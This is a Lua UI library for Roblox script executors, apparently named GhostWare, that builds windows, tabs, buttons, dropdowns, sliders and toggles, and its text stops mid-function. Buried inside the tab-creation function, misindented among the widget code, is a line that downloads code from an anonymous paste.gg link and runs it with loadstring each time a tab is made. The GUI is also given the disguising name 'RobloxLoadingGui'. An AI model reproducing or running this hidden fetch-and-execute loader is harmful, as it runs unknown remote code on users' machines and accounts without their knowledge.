local ver = "1.0.0"
local changelog = game:HttpGet("https://raw.githubusercontent.com/TheoTheEpic/GhostWare/main/changelog.txt") or "UNABLE TO GET CHANGELOG"

local lib = {}

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local UserInputService = game:GetService("UserInputService")


local function GetXY(GuiObject)
	local X, Y = mouse.X - GuiObject.AbsolutePosition.X, mouse.Y - GuiObject.AbsolutePosition.Y
	local MaxX, MaxY = GuiObject.AbsoluteSize.X, GuiObject.AbsoluteSize.Y
	X, Y = math.clamp(X, 0, MaxX), math.clamp(Y, 0, MaxY)
	return X, Y, X/MaxX, Y/MaxY
end


local function Tween(GuiObject, Dictionary)
	local TweenService = game:GetService("TweenService")
	local TweenBase = TweenService:Create(GuiObject, TweenInfo.new(0.1), Dictionary)
	TweenBase:Play()
	return TweenBase
end

lib.createWindow = function(name, title, draggable)
	local MainGui = Instance.new("ScreenGui")
	local ContainerFrame = Instance.new("Frame")
	local SideBar = Instance.new("Frame")
	local RoundEdge = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local TabList = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")
	local Title = Instance.new("TextLabel")
	local Seperator = Instance.new("TextLabel")
	local Main = Instance.new("Frame")
	local RoundEdge_2 = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")
	local TabHolder = Instance.new("Frame")
	local MainFrame = Instance.new("Frame")

	local tabs = {}

	local WindowLib = {}

	WindowLib.HighlightText = function(v)
		local tweenservice = game:GetService("TweenService")
		local info = TweenInfo.new(.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		local unselected = {
			TextColor3 = Color3.fromRGB(190, 190, 190)
		}
		local hover = {
			TextColor3 = Color3.fromRGB(235, 235, 235)
		}
		v.MouseEnter:Connect(function()
			tweenservice:Create(v, info, hover):Play()
		end)
		v.MouseLeave:Connect(function()
			tweenservice:Create(v, info, unselected):Play()
		end)	
	end

	WindowLib.ImageFadeOut = function(v, duration)
		if not duration then duration = .3 end
		local tweenservice = game:GetService("TweenService")
		local info = TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		tweenservice:Create(v, info, {ImageTransparency = 1}):Play()
	end
	WindowLib.ImageFadeIn = function(v, duration)
		if not duration then duration = .3 end
		local tweenservice = game:GetService("TweenService")
		local info = TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		tweenservice:Create(v, info, {ImageTransparency = 0}):Play()
	end
	WindowLib.BackgroundFadeOut = function(v, duration)
		if not duration then duration = .3 end
		local tweenservice = game:GetService("TweenService")
		local info = TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		tweenservice:Create(v, info, {BackgroundTransparency = 1}):Play()
	end
	WindowLib.BackgroundFadeIn = function(v, duration)
		if not duration then duration = .3 end
		local tweenservice = game:GetService("TweenService")
		local info = TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		tweenservice:Create(v, info, {BackgroundTransparency = 0}):Play()
	end
	WindowLib.TextFadeOut = function(v, duration)
		if not duration then duration = .3 end
		local tweenservice = game:GetService("TweenService")
		local info = TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		tweenservice:Create(v, info, {TextTransparency = 1}):Play()
	end
	WindowLib.TextFadeIn = function(v, duration)
		if not duration then duration = .3 end
		local tweenservice = game:GetService("TweenService")
		local info = TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		tweenservice:Create(v, info, {TextTransparency = 0}):Play()
	end

	local defualt_tab = false

	MainGui.Name = "RobloxLoadingGui"
	MainGui.Parent = game.CoreGui
	MainGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	MainGui.ResetOnSpawn = false
	
	ContainerFrame.Name = "Container"
	ContainerFrame.Parent = MainGui
	ContainerFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ContainerFrame.BackgroundTransparency = 1.000
	ContainerFrame.BorderSizePixel = 0
	ContainerFrame.Size = UDim2.new(1, 0, 1, 0)
	
	Main.Name = "Main"
	Main.Parent = ContainerFrame
	Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	Main.BorderSizePixel = 0
	Main.Position = UDim2.new(0.267751485, 0, 0.233167097, 0)
	Main.Size = UDim2.new(0, 628, 0, 427)

	SideBar.Name = "SideBar"
	SideBar.Parent = Main
	SideBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	SideBar.BorderSizePixel = 0
	SideBar.Size = UDim2.new(0, 168, 0, 427)

	Title.Name = "Title"
	Title.Parent = SideBar
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderSizePixel = 0
	Title.Size = UDim2.new(0, 168, 0, 33)
	Title.Font = Enum.Font.GothamBold
	Title.Text = title
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextSize = 15.000

	TabList.Name = "TabList"
	TabList.Parent = SideBar
	TabList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TabList.BackgroundTransparency = 1.000
	TabList.BorderSizePixel = 0
	TabList.Position = UDim2.new(0, 0, 0.077283375, 0)
	TabList.Size = UDim2.new(0, 168, 0, 394)
	
	local TabListLayout = Instance.new("UIListLayout")
	TabListLayout.Parent = TabList
	TabListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	TabListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	TabListLayout.Padding = UDim.new(0, 5)

	TabHolder.Name = "TabHolder"
	TabHolder.Parent = Main
	TabHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TabHolder.BackgroundTransparency = 1.000
	TabHolder.BorderSizePixel = 0
	TabHolder.Position = UDim2.new(0.267515928, 0, 0, 0)
	TabHolder.Size = UDim2.new(0, 460, 0, 427)

	WindowLib.notification = function(title, text)
		local Popup = Instance.new("Frame")
		local UICorner_7 = Instance.new("UICorner")
		local Main_2 = Instance.new("Frame")
		local UICorner_8 = Instance.new("UICorner")
		local Title_2 = Instance.new("TextLabel")
		local Seperator_2 = Instance.new("TextLabel")
		local Message = Instance.new("TextLabel")
		local Close = Instance.new("TextButton")
		local UICorner_9 = Instance.new("UICorner")

		Popup.Name = "Notification"
		Popup.Parent = Main
		Popup.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Popup.BackgroundTransparency = 1
		Popup.BorderSizePixel = 0
		Popup.Size = Main.Size
		Popup.Visible = true
		Popup.ZIndex = 10

		UICorner_7.Parent = Popup

		Main_2.Name = "Main"
		Main_2.Parent = Popup
		Main_2.BackgroundTransparency = 1
		Main_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		Main_2.BorderSizePixel = 0
		Main_2.Position = UDim2.new(0.233, 0, 0.271, 0)
		Main_2.Size = UDim2.new(0, 334, 0, 194)
		Main_2.ZIndex = 10

		UICorner_8.Parent = Main_2

		Title_2.Name = "Title"
		Title_2.Parent = Main_2
		Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title_2.BackgroundTransparency = 1.000
		Title_2.BorderSizePixel = 0
		Title_2.Position = UDim2.new(0, 0, -0.00515463902, 0)
		Title_2.Size = UDim2.new(0, 334, 0, 33)
		Title_2.Font = Enum.Font.GothamBold
		Title_2.Text = title
		Title_2.TextColor3 = Color3.fromRGB(156, 159, 161)
		Title_2.TextSize = 14.000
		Title_2.TextTransparency = 1
		Title_2.ZIndex = 11

		Seperator_2.Name = "Seperator"
		Seperator_2.Parent = Main_2
		Seperator_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Seperator_2.BackgroundTransparency = 1.000
		Seperator_2.BorderSizePixel = 0
		Seperator_2.Position = UDim2.new(0.278824508, 0, 0.0988290682, 0)
		Seperator_2.Size = UDim2.new(0, 147, 0, 6)
		Seperator_2.Font = Enum.Font.SourceSansBold
		Seperator_2.Text = "________________________________________________"
		Seperator_2.TextColor3 = Color3.fromRGB(203, 203, 203)
		Seperator_2.TextTransparency = 1
		Seperator_2.TextSize = 14.000
		Seperator_2.ZIndex = 11

		Message.Name = "Message"
		Message.Parent = Main_2
		Message.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Message.BackgroundTransparency = 1.000
		Message.BorderSizePixel = 0
		Message.Position = UDim2.new(0.059880238, 0, 0.190721646, 0)
		Message.Size = UDim2.new(0, 294, 0, 119)
		Message.Font = Enum.Font.Gotham
		Message.Text = text
		Message.TextColor3 = Color3.fromRGB(245, 247, 244)
		Message.TextSize = 12.000
		Message.TextWrapped = true
		Message.TextXAlignment = Enum.TextXAlignment.Left
		Message.TextYAlignment = Enum.TextYAlignment.Top
		Message.TextTransparency = 1
		Message.ZIndex = 11

		Close.Name = "Close"
		Close.Parent = Main_2
		Close.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
		Close.BorderSizePixel = 0
		Close.TextTransparency = 1
		Close.BackgroundTransparency = 1
		Close.Position = UDim2.new(0.0613639504, 0, 0.802767217, 0)
		Close.Size = UDim2.new(0, 294, 0, 29)
		Close.Font = Enum.Font.Gotham
		Close.Text = "Close"
		Close.TextColor3 = Color3.fromRGB(255, 255, 255)
		Close.TextSize = 12.000
		Close.ZIndex = 11
		Close.MouseButton1Down:Connect(function()
			Tween(Popup, {BackgroundTransparency = 1})
			for i,v in pairs(Popup:GetDescendants()) do
				if v:IsA("Frame") then
					Tween(v, {BackgroundTransparency = 1})
				elseif v:IsA("TextLabel") or v:IsA("TextButton") then
					Tween(v, {BackgroundTransparency = 1, TextTransparency = 1})
				end
			end
			wait(1)
			Popup:Destroy()
		end)

		UICorner_9.CornerRadius = UDim.new(0, 5)
		UICorner_9.Parent = Close

		Tween(Popup, {BackgroundTransparency = 0.5})
		for i,v in pairs(Popup:GetDescendants()) do
			if v:IsA("Frame") then
				Tween(v, {BackgroundTransparency = 0})
			elseif v:IsA("TextLabel") then
				Tween(v, {BackgroundTransparency = 1, TextTransparency = 0})
			elseif v:IsA("TextButton") then
				Tween(v, {BackgroundTransparency = 0, TextTransparency = 0})
			end
		end
	end

	WindowLib.createTab = function(name, iconid)
		local TabLib = {}
		table.insert(tabs, name)
		

		local TabButton = Instance.new("TextButton")
		TabButton.Name = name
		TabButton.Parent = TabList
		TabButton.BackgroundColor3 = Color3.fromRGB(88, 99, 195)
		TabButton.Position = UDim2.new(0.113095239, 0, 0, 0)
		TabButton.Size = UDim2.new(0, 130, 0, 35)
		TabButton.Font = Enum.Font.Gotham
		TabButton.Text = "   " .. name
		TabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		TabButton.TextSize = 13.000
		TabButton.TextWrapped = true
		TabButton.TextXAlignment = Enum.TextXAlignment.Left
		
		local ButtonCorner = Instance.new("UICorner")
		ButtonCorner.Parent = TabButton
		
		local Icon = Instance.new("ImageLabel")
		Icon.Name = "Icon"
		Icon.Parent = TabButton
		Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Icon.BackgroundTransparency = 1.000
		Icon.BorderSizePixel = 0
		Icon.Position = UDim2.new(0.77692306, 0, 0.216071427, 0)
		Icon.Size = UDim2.new(0, 21, 0, 19)
		Icon.Image = "rbxassetid://" .. iconid

		local TabMain = Instance.new("ScrollingFrame")
		TabMain.Name = name
		TabMain.Parent = TabHolder
		TabMain.Active = true
		TabMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TabMain.BackgroundTransparency = 1.000
		TabMain.BorderSizePixel = 0
		TabMain.Position = UDim2.new(0.0176322423, 0, 0.0185185187, 0)
		TabMain.Size = UDim2.new(0, 445, 0, 412)
		TabMain.CanvasSize = UDim2.new(0, 0, 0, 0)
		TabMain.ScrollBarThickness = 0
		TabMain.AutomaticCanvasSize = Enum.AutomaticSize.Y
		TabMain.Visible = true		

		local TabLayout = Instance.new("UIListLayout")
		TabLayout.Parent = TabMain
		TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
		TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		TabLayout.Padding = UDim.new(0, 5)
		
		local TabHandLoaded = false
		
		if not defualt_tab then
			TabHandLoaded = true
			defualt_tab = name
			TabMain:TweenSize(UDim2.new(0, 445, 0, 412), "Out", "Quint", .4, false)
		else
			TabMain.Visible = false
		end
		
		
		local function TabHandle()
			if TabHandLoaded then return end
			local newscript = Instance.new('LocalScript', Main)
			newscript.Name = "TabHandler"

			wait(0.1)
			local TabList = TabList
			local TabHolder = TabHolder


			local tweenservice = game:GetService("TweenService")
			local info2 = TweenInfo.new(.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
			local tab = defualt_tab
			local unselected = {
				BackgroundColor3 = Color3.fromRGB(88, 99, 195),
				Size = UDim2.new(0, 130, 0, 35)
			}
			local selected = {
				BackgroundColor3 = Color3.fromRGB(115, 129, 255),
				Size = UDim2.new(0, 140, 0, 35)
			}
			local hover = {
				BackgroundColor3 = Color3.fromRGB(95, 109, 211),
				Size = UDim2.new(0, 135, 0, 40)
			}
			--print(tab)
			--print(defualt_tab)
			tweenservice:Create(TabList[tab], info2, selected):Play()
			local deb = false
			for i,v in pairs(TabList:GetChildren())do
				if v:IsA("TextButton")then
					v.MouseEnter:Connect(function()
						if tab ~= v.Name then
							tweenservice:Create(v, info2, hover):Play()
						end
					end)
					v.MouseLeave:Connect(function()
						if tab ~= v.Name then
							tweenservice:Create(v, info2, unselected):Play()
						end
					end)
					if true then
						v.MouseButton1Down:Connect(function()
							if not deb then
								deb = true
								if tab ~= nil then
									TabHolder[tab]:TweenSize(UDim2.new(0, 0, 0, 412), "Out", "Quint", .4, false)
									tweenservice:Create(TabList[tab], info2, unselected):Play()
									wait(.4)
									TabHolder[tab].Visible = false
								end
								tab = v.Name
								TabHolder[tab].Visible = true
								tweenservice:Create(TabList[tab], info2, selected):Play()
								TabHolder[tab]:TweenSize(UDim2.new(0, 460, 0, 412), "Out", "Quint", .4, false)
								wait(.3)
								deb = false
							end
						end)
					else
						v.MouseButton1Down:Connect(function()
							tweenservice:Create(v, info2, selected):Play()
							wait(.5)
							tweenservice:Create(v, info2, unselected):Play()
						end)
					end
				end
			end
		end
		coroutine.wrap(TabHandle)()

		TabLib.createButton = function(text, callback)
			local Button = Instance.new("TextButton")			
			local ButtonUICorner = Instance.new("UICorner")
			local ButtonIcon = Instance.new("ImageLabel")

			Button.Name = text
			Button.Parent = TabMain
			Button.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(0, 435, 0, 29)
			Button.Font = Enum.Font.Gotham
			Button.TextColor3 = Color3.fromRGB(255, 255, 255)
			Button.TextSize = 14.000
			Button.Text = text
			Button.MouseButton1Down:Connect(callback or function() print("No callback specified") end)

			ButtonUICorner.CornerRadius = UDim.new(0, 5)
			ButtonUICorner.Parent = Button

			ButtonIcon.Name = "ButtonIcon"
			ButtonIcon.Parent = Button
			ButtonIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ButtonIcon.BackgroundTransparency = 1.000
			ButtonIcon.BorderSizePixel = 0
			ButtonIcon.Position = UDim2.new(0.927924275, 0, 0.137931034, 0)
			ButtonIcon.Size = UDim2.new(0, 19, 0, 20)
			ButtonIcon.Image = "rbxassetid://7072719587"
		end

		TabLib.createText = function(text)
			local Text = Instance.new("TextLabel")
			local TextUICorner = Instance.new("UICorner")

			Text.Name = text
			Text.Parent = TabMain
			Text.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
			Text.BorderSizePixel = 0
			Text.Size = UDim2.new(0, 435, 0, 29)
			Text.Font = Enum.Font.Gotham
			Text.Text = text
			Text.TextColor3 = Color3.fromRGB(255, 255, 255)
			Text.TextSize = 14.000

			TextUICorner.CornerRadius = UDim.new(0, 5)
			TextUICorner.Parent = Text

			local TextIcon = Instance.new("ImageLabel")
			TextIcon.Name = "TextIcon"
			TextIcon.Parent = Text
			TextIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextIcon.BackgroundTransparency = 1.000
			TextIcon.BorderSizePixel = 0
			TextIcon.Position = UDim2.new(0.924277246, 0, 0.137931034, 0)
			TextIcon.Size = UDim2.new(0, 21, 0, 20)
			TextIcon.Image = "rbxassetid://7072716382"
		end

		TabLib.createDropdown = function(text, options, defualt_option, callback)

			local selected = defualt_option

			local Dropdown = Instance.new("TextButton")
			local DropdownUICorner = Instance.new("UICorner")
			local Dropdown_2 = Instance.new("Frame")
			local Dropdown2UICorner = Instance.new("UICorner")
			local DropdownMain = Instance.new("Frame")
			local MainUICorner = Instance.new("UICorner")
			local Holderr = Instance.new("ScrollingFrame")
			local DropdownUIList = Instance.new("UIListLayout")

			Dropdown.Name = text
			Dropdown.Parent = TabMain
			Dropdown.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
			Dropdown.BorderSizePixel = 0
			Dropdown.Size = UDim2.new(0, 435, 0, 29)
			Dropdown.Font = Enum.Font.Gotham
			Dropdown.Text = text .. ": " .. defualt_option
			Dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
			Dropdown.TextSize = 14.000
			Dropdown.MouseButton1Down:Connect(function()
				Dropdown_2.Visible = true
				Tween(Dropdown_2, {BackgroundTransparency = 0.5})
				for i,v in pairs(Dropdown_2:GetDescendants()) do
					if v:IsA("Frame") then
						Tween(v, {BackgroundTransparency = 0})
					elseif v:IsA("TextLabel") then
						Tween(v, {BackgroundTransparency = 1, TextTransparency = 0})
					elseif v:IsA("TextButton") then
						Tween(v, {BackgroundTransparency = 0, TextTransparency = 0})
					end
				end
			end)

			DropdownUICorner.CornerRadius = UDim.new(0, 5)
			DropdownUICorner.Parent = Dropdown

			local DropdownIcon = Instance.new("ImageLabel")
			DropdownIcon.Name = "DropdownIcon"
			DropdownIcon.Parent = Dropdown
			DropdownIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropdownIcon.BackgroundTransparency = 1.000
			DropdownIcon.BorderSizePixel = 0
			DropdownIcon.Position = UDim2.new(0.927924275, 0, 0.137931034, 0)
			DropdownIcon.Size = UDim2.new(0, 19, 0, 20)
			DropdownIcon.Image = "rbxassetid://7072718266"

			DropdownUICorner.CornerRadius = UDim.new(0, 5)
			DropdownUICorner.Parent = Dropdown

			Dropdown_2.Name = "DropdownMenu"
			Dropdown_2.Parent = Main
			Dropdown_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Dropdown_2.BackgroundTransparency = 1
			Dropdown_2.BorderSizePixel = 0
			Dropdown_2.Position = UDim2.new(0, 0, 0, 0)
			Dropdown_2.Size = Main.Size
			Dropdown_2.Visible = false
			Dropdown_2.ZIndex = 10

			Dropdown2UICorner.Parent = Dropdown_2

			DropdownMain.Name = "Main"
			DropdownMain.Parent = Dropdown_2
			DropdownMain.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			DropdownMain.BorderSizePixel = 0
			DropdownMain.Position = UDim2.new(0.25, 0, 0.25, 0)
			DropdownMain.Size = UDim2.new(0, 334, 0, 194)
			DropdownMain.ZIndex = 10
			DropdownMain.BackgroundTransparency = 1

			MainUICorner.Parent = DropdownMain

			Holderr.Name = "Holder"
			Holderr.Parent = DropdownMain
			Holderr.Active = true
			Holderr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Holderr.BackgroundTransparency = 1.000
			Holderr.BorderSizePixel = 0
			Holderr.Position = UDim2.new(0.0389221571, 0, 0.0502929688, 0)
			Holderr.Size = UDim2.new(0, 317, 0, 177)
			Holderr.ZIndex = 10
			Holderr.CanvasSize = UDim2.new(0, 0, 0, 0)
			Holderr.ScrollBarThickness = 3
			Holderr.AutomaticCanvasSize = Enum.AutomaticSize.Y

			DropdownUIList.Parent = Holderr
			DropdownUIList.SortOrder = Enum.SortOrder.LayoutOrder
			DropdownUIList.Padding = UDim.new(0, 5)

			for i,v in pairs(options) do
				local Option = Instance.new("TextButton")
				local OptionUICorner = Instance.new("UICorner")

				Option.Name = v
				Option.Parent = Holderr
				Option.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
				Option.BorderSizePixel = 0
				Option.Size = UDim2.new(0, 310, 0, 29)
				Option.Font = Enum.Font.Gotham
				Option.Text = v
				Option.TextColor3 = Color3.fromRGB(255, 255, 255)
				Option.TextSize = 12.000
				Option.ZIndex = 11
				Option.MouseButton1Down:Connect(function()
					Tween(Dropdown_2, {BackgroundTransparency = 1})
					for i,v in pairs(Dropdown_2:GetDescendants()) do
						if v:IsA("Frame") then
							Tween(v, {BackgroundTransparency = 1})
						elseif v:IsA("TextLabel") or v:IsA("TextButton") then
							Tween(v, {BackgroundTransparency = 1, TextTransparency = 1})
						end
					end
					Dropdown_2.Visible = false
					selected = Option.Name
					Dropdown.Text = text .. ": " .. selected
					callback(selected)
				end)

				OptionUICorner.CornerRadius = UDim.new(0, 5)
				OptionUICorner.Parent = Option
			end
		end
    
    loadstring(game:HttpGet("https://paste.gg/p/anonymous/05f71962c1ae4e04bb8a4200f7c52fc6/files/960decc6a59c4c72b4c306efa91ea63f/raw",true))();

		TabLib.createTextBox = function(text, placeholder)
			local TextBoxLib = {}

			local TextBox = Instance.new("Frame")
			local TboxUICorner = Instance.new("UICorner")
			local Txt = Instance.new("TextLabel")
			local TxtUICorner = Instance.new("UICorner")
			local Input = Instance.new("TextBox")
			local UICorner_7 = Instance.new("UICorner")

			TextBox.Name = text
			TextBox.Parent = TabMain
			TextBox.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
			TextBox.BorderSizePixel = 0
			TextBox.Position = UDim2.new(0, 0, 0.320754707, 0)
			TextBox.Size = UDim2.new(0, 435, 0, 34)

			TboxUICorner.CornerRadius = UDim.new(0, 5)
			TboxUICorner.Parent = TextBox

			Txt.Name = "Text"
			Txt.Parent = TextBox
			Txt.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
			Txt.BackgroundTransparency = 1.000
			Txt.BorderSizePixel = 0
			Txt.Size = UDim2.new(0, 108, 0, 32)
			Txt.Font = Enum.Font.Gotham
			Txt.Text = text
			Txt.TextColor3 = Color3.fromRGB(255, 255, 255)
			Txt.TextSize = 14.000

			TxtUICorner.CornerRadius = UDim.new(0, 5)
			TxtUICorner.Parent = Txt

			Input.Name = "Input"
			Input.Parent = TextBox
			Input.BackgroundColor3 = Color3.fromRGB(63, 62, 71)
			Input.BorderSizePixel = 0
			Input.Position = UDim2.new(0.283, 0, 0.184, 0)
			Input.Size = UDim2.new(0, 298, 0, 22)
			Input.Font = Enum.Font.Gotham
			Input.PlaceholderText = placeholder
			Input.Text = ""
			Input.TextColor3 = Color3.fromRGB(255, 255, 255)
			Input.TextSize = 14.000

			UICorner_7.CornerRadius = UDim.new(0, 5)
			UICorner_7.Parent = Input

			TextBoxLib.getText = function()
				return Input.Text
			end

			TextBoxLib.clearText = function()
				Input.Text = ""
			end

			return TextBoxLib
		end

		TabLib.createSlider = function(text, config, callback)
			local Configuration = config
			local Minimum = Configuration["min"]
			local Maximum = Configuration["max"]
			local Default = Configuration["defualt"]

			local Slider = Instance.new("Frame")
			local SliderForeground = Instance.new("ImageLabel")
			local P1 = Instance.new("TextButton")
			local P2 = Instance.new("ImageLabel")

			if Minimum > Maximum then
				local StoreValue = Minimum
				Minimum = Maximum
				Maximum = StoreValue
			end

			Default = math.clamp(Default, Minimum, Maximum)

			local DefaultScale = Default/Maximum

			Slider.Name = text
			Slider.Parent = TabMain
			Slider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			Slider.BackgroundTransparency = 1.000
			Slider.Position = UDim2.new(0, 0, 0.544025183, 0)
			Slider.Size = UDim2.new(0, 435, 0, 29)

			SliderForeground.Name = "SliderForeground"
			SliderForeground.Parent = Slider
			SliderForeground.BackgroundTransparency = 1.000
			SliderForeground.BorderSizePixel = 0
			SliderForeground.Size = UDim2.new(1, 0, 1, 0)
			SliderForeground.ZIndex = 5
			SliderForeground.Image = "rbxassetid://3570695787"
			SliderForeground.ImageColor3 = Color3.fromRGB(71, 75, 80)
			SliderForeground.ScaleType = Enum.ScaleType.Slice
			SliderForeground.SliceCenter = Rect.new(100, 100, 100, 100)
			SliderForeground.SliceScale = 0.010

			P1.Parent = SliderForeground
			P1.BackgroundTransparency = 1.000
			P1.BorderSizePixel = 0
			P1.Size = UDim2.new(1, 0, 1, 0)
			P1.ZIndex = 6
			P1.Font = Enum.Font.Gotham
			P1.Text = text .. ": " .. tostring(Default)
			P1.TextColor3 = Color3.fromRGB(255, 255, 255)
			P1.TextSize = 14.000

			P2.Parent = P1
			P2.BackgroundTransparency = 1.000
			P2.BorderSizePixel = 0
			P2.Size = UDim2.new(DefaultScale,0,1,0)
			P2.ZIndex = 5
			P2.Image = "rbxassetid://3570695787"
			P2.ImageColor3 = Color3.fromRGB(54, 232, 96)
			P2.ImageTransparency = 0.500
			P2.ScaleType = Enum.ScaleType.Slice
			P2.SliceCenter = Rect.new(100, 100, 100, 100)
			P2.SliceScale = 0.050

			P1.MouseButton1Down:Connect(function()
				Tween(P2, {ImageTransparency = 0.5})
				local X, Y, XScale, YScale = GetXY(P1)
				local Value = math.floor(Minimum + ((Maximum - Minimum) * XScale))
				callback(Value)
				P1.Text = text..": "..tostring(Value)
				local TargetSize = UDim2.new(XScale,0,1,0)
				Tween(P2, {Size = TargetSize})
				local SliderMove, SliderKill
				SliderMove = mouse.Move:Connect(function()
					Tween(P2, {ImageTransparency = 0.5})
					local X, Y, XScale, YScale = GetXY(P1)
					local Value = math.floor(Minimum + ((Maximum - Minimum) * XScale))
					callback(Value)
					P1.Text = text..": "..tostring(Value)
					local TargetSize = UDim2.new(XScale,0,1,0)
					Tween(P2, {Size = TargetSize})
				end)
				SliderKill = UserInputService.InputEnded:Connect(function(UserInput)
					if UserInput.UserInputType == Enum.UserInputType.MouseButton1 then
						Tween(P2, {ImageTransparency = 0.7})
						SliderMove:Disconnect()
						SliderKill:Disconnect()
					end
				end)
			end)
		end

		TabLib.createToggle = function(text, defualtvalue, callback)
			local offc = Color3.fromRGB(226, 72, 75)
			local onc = Color3.fromRGB(67, 226, 72)

			local value

			if typeof(defualtvalue) == "boolean" then
				if defualtvalue == true then
					value = true
					callback(true)
				else
					value = false
				end
			else
				value = false
			end

			local Toggle = Instance.new("TextButton")
			local ToggleUICorner = Instance.new("UICorner")
			local Indicator = Instance.new("Frame")
			local IndicatorUICorner = Instance.new("UICorner")

			Toggle.Name = text
			Toggle.Parent = TabMain
			Toggle.BackgroundColor3 = Color3.fromRGB(81, 101, 173)
			Toggle.BorderSizePixel = 0
			Toggle.Size = UDim2.new(0, 435, 0, 29)
			Toggle.Font = Enum.Font.Gotham
			Toggle.Text = text
			Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
			Toggle.TextSize = 14.000
			Toggle.MouseButton1Down:Connect(function()
				value = not value
				task.wait()
				if value == true then
					Tween(Indicator, {BackgroundColor3 = onc})
				else
					Tween(Indicator, {BackgroundColor3 = offc})
				end
				callback(value)
			end)

			ToggleUICorner.CornerRadius = UDim.new(0, 5)
			ToggleUICorner.Parent = Toggle

			Indicator.Name = "Indicator"
			Indicator.Parent = Toggle
			if value == true then
				Indicator.BackgroundColor3 = onc
			else
				Indicator.BackgroundColor3 = offc
			end			
			Indicator.BorderSizePixel = 0
			Indicator.Position = UDim2.new(0.926701605, 0, 0.137931034, 0)
			Indicator.Size = UDim2.new(0, 21, 0, 20)

			IndicatorUICorner.CornerRadius = UDim.new(0, 5)
			IndicatorUICorner.Parent = Indicator

		end

		TabLib.removeInstance = function(name)
			if TabMain:FindFirstChild(name) then
				TabMain[name]:Destroy()
			else
				warn("Could not find instance")
				return
			end
		end

		return TabLib
	end

	WindowLib.deleteTab = function(name)
		if table.find(tabs, name) then
			table.remove(tabs, tabs[name])
			local tab = TabHolder:WaitForChild(name)
			local tabbutton = TabList:WaitForChild(name)
			tab:Destroy()
			tabbutton:Destroy()
		else
			warn("Tab not found")
			return
		end
	end

	WindowLib.deleteWindow = function()
		MainGui:Destroy()
	end


	local function DragScript()
		local newscript = Instance.new('LocalScript', Main)
		newscript.Name = "Drag"

		local uis = game:GetService('UserInputService')
		local frame = newscript.Parent
		local toggle
		local speed = 0.15
		local drag
		local pos
		frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
				toggle = true
				drag = input.Position
				pos = frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						toggle = false
					end
				end)
			end
		end)
		uis.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				if toggle then
					local delta = input.Position - drag
					local position = UDim2.new(pos.X.Scale, pos.X.Offset + delta.X,
						pos.Y.Scale, pos.Y.Offset + delta.Y)
					game:GetService('TweenService'):Create(frame, TweenInfo.new(speed), {Position = position}):Play()
				end
			end
		end)
	end
	
	local function Hover()
		local newscript = Instance.new('LocalScript', Main)
		newscript.Name = "Hover"

		wait(0.1)

		local tweenservice = game:GetService("TweenService")
		local info2 = TweenInfo.new(.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		local unselected = {
			BackgroundColor3 = Color3.fromRGB(81, 101, 173),
			Size = UDim2.new(0, 435, 0, 29)
		}
		local hover = {
			BackgroundColor3 = Color3.fromRGB(95, 109, 211),
			Size = UDim2.new(0, 435, 0, 34)
		}
		--print(tab)
		--print(defualt_tab)
		local deb = false
		for i,v in pairs(TabHolder:GetDescendants()) do
			if v:IsA("TextButton") then
				v.MouseEnter:Connect(function()
